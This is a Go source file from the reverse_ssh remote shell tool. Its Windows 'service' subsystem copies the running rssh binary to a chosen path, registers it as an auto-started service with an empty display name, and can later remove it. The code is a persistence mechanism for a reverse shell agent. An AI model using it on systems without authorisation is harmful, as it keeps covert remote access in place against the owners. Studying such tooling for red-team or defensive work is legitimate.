//go:build windows

package subsystems

import (
	"errors"
	"fmt"
	"io/ioutil"
	"os"

	"github.com/NHAS/reverse_ssh/internal/terminal"
	"golang.org/x/crypto/ssh"
	"golang.org/x/sys/windows/svc/eventlog"
	"golang.org/x/sys/windows/svc/mgr"
)

type service bool

func (s *service) Execute(line terminal.ParsedLine, connection ssh.Channel, subsystemReq *ssh.Request) error {
	subsystemReq.Reply(true, nil)

	arg, err := line.GetArgString("install")
	if err != terminal.ErrFlagNotSet {
		if err != nil {
			return err
		}
		return s.installService("rssh", arg)
	}

	arg, err = line.GetArgString("uninstall")
	if err != terminal.ErrFlagNotSet {
		if err != nil {
			return err
		}

		return s.uninstallService(arg)
	}

	return errors.New(terminal.MakeHelpText(
		"service [MODE] [ARGS|...]",
		"The service submodule can install or removed the rssh binary as a service",
		"\t--install\tTakes 1 argument, a location to copy the rssh binary to. E.g service --install rssh C:\\path\\here\\rssh.exe",
		"\t--uninstall\tTakes 1 argument, the name of a service to remove. Will not check if this is the rssh service",
	))
}

func (s *service) installService(name, location string) error {

	currentPath, err := os.Executable()
	if err != nil {
		return errors.New("Unable to find the current binary location: " + err.Error())
	}

	input, err := ioutil.ReadFile(currentPath)
	if err != nil {
		return err
	}

	err = ioutil.WriteFile(location, input, 0644)
	if err != nil {
		return err
	}

	m, err := mgr.Connect()
	if err != nil {
		return err
	}
	defer m.Disconnect()

	newService, err := m.OpenService(name)
	if err == nil {
		newService.Close()
		return fmt.Errorf("service %s already exists", name)
	}
	newService, err = m.CreateService(name, location, mgr.Config{DisplayName: ""}, "is", "auto-started")
	if err != nil {
		return err
	}
	defer newService.Close()
	err = eventlog.InstallAsEventCreate(name, eventlog.Error|eventlog.Warning|eventlog.Info)
	if err != nil {
		newService.Delete()
		return fmt.Errorf("SetupEventLogSource() failed: %s", err)
	}
	return nil

}

func (s *service) uninstallService(name string) error {
	m, err := mgr.Connect()
	if err != nil {
		return err
	}
	defer m.Disconnect()
	serviceToRemove, err := m.OpenService(name)
	if err != nil {
		return fmt.Errorf("service %s is not installed", name)
	}
	defer serviceToRemove.Close()
	err = serviceToRemove.Delete()
	if err != nil {
		return err
	}
	err = eventlog.Remove(name)
	if err != nil {
		return fmt.Errorf("RemoveEventLogSource() failed: %s", err)
	}
	return nil

}
